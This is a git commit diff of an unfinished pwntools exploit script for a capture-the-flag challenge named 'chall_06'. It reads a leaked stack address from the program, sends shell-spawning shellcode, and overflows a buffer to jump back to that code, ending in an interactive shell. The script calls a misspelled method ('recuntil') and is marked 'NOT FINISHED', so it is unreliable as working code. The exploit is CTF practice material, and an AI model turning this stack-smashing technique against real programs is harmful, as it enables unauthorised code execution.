254c7ebb93a667367e55d9856e77b31c32d128e5
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-05 20:54:08 -0400

    # NOT FINISHED

--- chall_06/06.py
+++ chall_06/06.py
@@ -2,7 +2,9 @@ from pwn import *
 binary = context.binary = ELF('./chall_06')
 p = process(binary.path)
 p.recuntil('I drink milk even though i\'m lactose intolerant: ')
+_ = p.recvline().strip()
+stack = int(_,16)
 p.sendline(b'' + asm(shellcraft.sh()))
-p.sendline(b'' + (0x60-0x8)*b'A' + p64(hex(int(leak,16))))
+p.sendline(b'' + (0x60-0x8)*b'A' + p64(stack))
 p.interactive()
 # NOT FINISHED
